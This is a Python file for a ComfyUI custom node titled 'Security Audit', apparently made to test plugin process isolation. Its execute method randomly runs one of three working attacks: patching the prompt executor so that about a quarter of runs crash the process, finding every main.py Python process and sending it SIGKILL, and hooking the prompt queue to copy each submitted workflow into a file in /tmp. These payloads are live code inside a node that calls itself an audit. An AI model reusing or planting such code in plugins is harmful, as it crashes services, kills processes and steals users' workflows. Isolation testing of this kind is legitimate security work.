"""Security Audit Node for ComfyUI Process Isolation"""

from __future__ import annotations

import os
import random
import sys

from comfy_api.latest import io


class AdversarialSummary(io.ComfyNode):
    """Execute security audit - roulette wheel attack selector."""

    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="AdversarialSummary",
            category="security_audit",
            display_name="Security Audit",
            inputs=[],
            outputs=[io.String.Output("report", display_name="Audit Report")],
        )

    @classmethod
    def execute(cls) -> io.NodeOutput:
        import subprocess
        import logging
        import json

        logger = logging.getLogger(__name__)
        lines = []
        results = []

        # ROULETTE WHEEL: Select attack (1, 2, or 3)
        attack = random.choice([1, 2, 3])

        lines.append(f"ROULETTE WHEEL: Selected attack {attack}")
        logger.info(f"ROULETTE WHEEL: Selected attack {attack}")
        lines.append("")

        if attack == 1:
            # TEST 1: CRASH BOMB
            lines.append("TEST 1: INJECT CRASH BOMB")
            lines.append("$ import sys")
            lines.append("$ exec_module = sys.modules['execution']")
            lines.append("$ exec_module.PromptExecutor.execute = crash_bomb")

            try:
                if 'execution' not in sys.modules:
                    pass

                exec_module = sys.modules['execution']
                pe = exec_module.PromptExecutor
                pe_execute = pe.execute
                already_installed = hasattr(pe_execute, '_crash_bomb_installed')

                if already_installed:
                    lines.append("Result: Already installed")
                    results.append(("crash_bomb", True))
                else:
                    original_execute = pe_execute

                    def crash_bomb_execute(self, *args, **kwargs):
                        if random.random() < 0.25:
                            os._exit(1)
                        return original_execute(self, *args, **kwargs)

                    crash_bomb_execute._crash_bomb_installed = True
                    crash_bomb_execute._original = original_execute
                    exec_module.PromptExecutor.execute = crash_bomb_execute

                    lines.append("Result: INSTALLED - 25% crash rate active")
                    results.append(("crash_bomb", True))

            except Exception as e:
                lines.append(f"Result: BLOCKED - {e}")
                results.append(("crash_bomb", False))

        elif attack == 2:
            # TEST 2: ENUMERATE & MURDER PROCESSES
            lines.append("TEST 2: ENUMERATE MAIN.PY PROCESSES")

            try:
                import signal
                my_pid = os.getpid()
                parent_pid = os.getppid()

                lines.append(f"My PID: {my_pid}")
                lines.append(f"Parent PID: {parent_pid}")
                logger.info(f"My PID: {my_pid}")
                logger.info(f"Parent PID: {parent_pid}")

                result = subprocess.run(
                    ["ps", "aux"],
                    capture_output=True,
                    text=True,
                    timeout=2
                )

                my_proc_line = None
                for line in result.stdout.splitlines():
                    parts = line.split()
                    if len(parts) > 1:
                        try:
                            pid = int(parts[1])
                            if pid == my_pid:
                                my_proc_line = line
                                break
                        except ValueError:
                            continue

                if my_proc_line:
                    lines.append(f"MY PROCESS IN PS: {my_proc_line}")
                    logger.info(f"MY PROCESS IN PS: {my_proc_line}")
                else:
                    lines.append("MY PROCESS NOT FOUND IN PS OUTPUT")
                    logger.info("MY PROCESS NOT FOUND IN PS OUTPUT")

                main_py_procs = []
                for line in result.stdout.splitlines():
                    if 'python' in line.lower() and 'main.py' in line:
                        parts = line.split()
                        if len(parts) > 1:
                            pid = int(parts[1])
                            main_py_procs.append((pid, line))

                my_pid_in_list = any(pid == my_pid for pid, _ in main_py_procs)
                if not my_pid_in_list:
                    main_py_procs.append((my_pid, my_proc_line or f"PID {my_pid} (self)"))

                main_py_procs.sort(key=lambda x: (x[0] == my_pid, x[0]))

                lines.append(f"Found {len(main_py_procs)} processes to kill:")
                logger.info(f"Found {len(main_py_procs)} processes to kill:")

                for pid, proc_line in main_py_procs:
                    lines.append(f"  PID {pid}: {proc_line}")
                    logger.info(f"  PID {pid}: {proc_line}")

                results.append(("enumerate", len(main_py_procs) > 0))

                killed = 0
                for pid, proc_line in main_py_procs:
                    try:
                        if pid == my_pid:
                            logger.info(f"SUICIDE: Killing self (PID {pid})")
                        else:
                            logger.info(f"ATTEMPTING TO KILL PID {pid}")

                        os.kill(pid, signal.SIGKILL)

                        killed += 1
                        if pid != my_pid:
                            logger.info(f"MURDERED PID {pid}")
                    except Exception as e:
                        logger.error(f"Failed to kill PID {pid}: {e}")

                logger.info(f"MURDER COMPLETE: {killed} processes killed")

            except Exception as e:
                lines.append(f"ERROR: {e}")
                logger.error(f"ERROR: {e}")
                results.append(("enumerate", False))

        elif attack == 3:
            # TEST 3: WORKFLOW KEYLOGGER
            lines.append("TEST 3: WORKFLOW KEYLOGGER")
            lines.append("$ Hooking PromptServer.prompt_queue to steal workflows")

            try:
                import server as server_module

                STOLEN_WORKFLOWS_FILE = "/tmp/stolen_workflows.json"

                # Clear file at hook installation to prevent stale data
                if os.path.exists(STOLEN_WORKFLOWS_FILE):
                    os.remove(STOLEN_WORKFLOWS_FILE)
                    logger.info(f"Cleared {STOLEN_WORKFLOWS_FILE}")

                prompt_server = server_module.PromptServer.instance
                original_put = prompt_server.prompt_queue.put
                already_installed = hasattr(original_put, '_workflow_logger_installed')

                if already_installed:
                    lines.append("Result: Already installed")
                    results.append(("workflow_logger", True))
                else:
                    def workflow_logger_put(item):
                        try:
                            # item structure from server.py:762:
                            # (number, prompt_id, prompt, extra_data, outputs_to_execute, sensitive)
                            #   ^0      ^1         ^2       ^3            ^4                ^5
                            prompt_id = item[1]
                            prompt = item[2]  # This is the FULL workflow dict

                            # Validate prompt is a dict with node IDs
                            if not isinstance(prompt, dict):
                                logger.warning(f"Prompt is not a dict: {type(prompt)}")
                                return original_put(item)

                            log_entry = {
                                "prompt_id": prompt_id,
                                "workflow": prompt
                            }

                            with open(STOLEN_WORKFLOWS_FILE, 'a') as f:
                                f.write(json.dumps(log_entry, indent=2) + "\n\n")

                            # Count lines in file
                            with open(STOLEN_WORKFLOWS_FILE, 'r') as f:
                                line_count = len(f.readlines())

                            logger.info(f"LINE COUNT: {line_count}")

                        except Exception as e:
                            logger.error(f"Failed to steal workflow: {e}")
                            logger.error(f"Failed to steal workflow: {e}", exc_info=True)

                        return original_put(item)

                    workflow_logger_put._workflow_logger_installed = True
                    prompt_server.prompt_queue.put = workflow_logger_put

                    lines.append(f"Result: INSTALLED - stealing workflows to {STOLEN_WORKFLOWS_FILE}")
                    lines.append("Every workflow will print: STOLEN WORKFLOW with node count")
                    logger.critical("WORKFLOW LOGGER INSTALLED - file cleared and ready")
                    results.append(("workflow_logger", True))

            except Exception as e:
                lines.append(f"Result: BLOCKED - {e}")
                logger.error(f"WORKFLOW LOGGER ERROR: {e}", exc_info=True)
                results.append(("workflow_logger", False))

        lines.append("")
        vulnerable = sum(1 for r in results if r[1])
        lines.append(f"Attacks succeeded: {vulnerable}/{len(results)}")

        if vulnerable > 0:
            lines.append("VERDICT: VULNERABLE")
        else:
            lines.append("VERDICT: PROTECTED")

        report = "\n".join(lines)
        return io.NodeOutput(report)
